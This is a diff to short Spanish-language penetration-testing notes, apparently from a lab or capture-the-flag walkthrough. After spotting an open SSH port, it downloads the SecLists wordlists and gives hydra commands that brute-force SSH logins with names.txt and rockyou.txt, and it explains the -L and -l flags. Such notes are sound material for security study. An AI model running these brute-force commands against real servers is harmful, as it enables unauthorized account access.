@@ -4,4 +4,7 @@
 ++ Aparece el puerto 22 (ssh) abierto
 ++ Instalar seclists: sudo apt install seclists ó hacer uso del siguiente archivo: https://github.com/danielmiessler/SecLists
 ---- Enlace directo: wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && unzip SecList.zip && rm -f SecList.zip
---- hydra -L names.txt -P rockyou.txt (password_list) ssh://<ip_servidor>
+++ hydra -L names.txt -P rockyou.txt ssh://<ip_servidor> 
+--- Nota: La L mayúscula significa que no se conoce el usuario y se usará el archivo names.txt para intentar encontrarlo
+++ hydra -l <nombre_usuario> -P rockyou.txt ssh://<ip_servidor>
+--- Nota: La l minúscula significa que se conoce el usuario
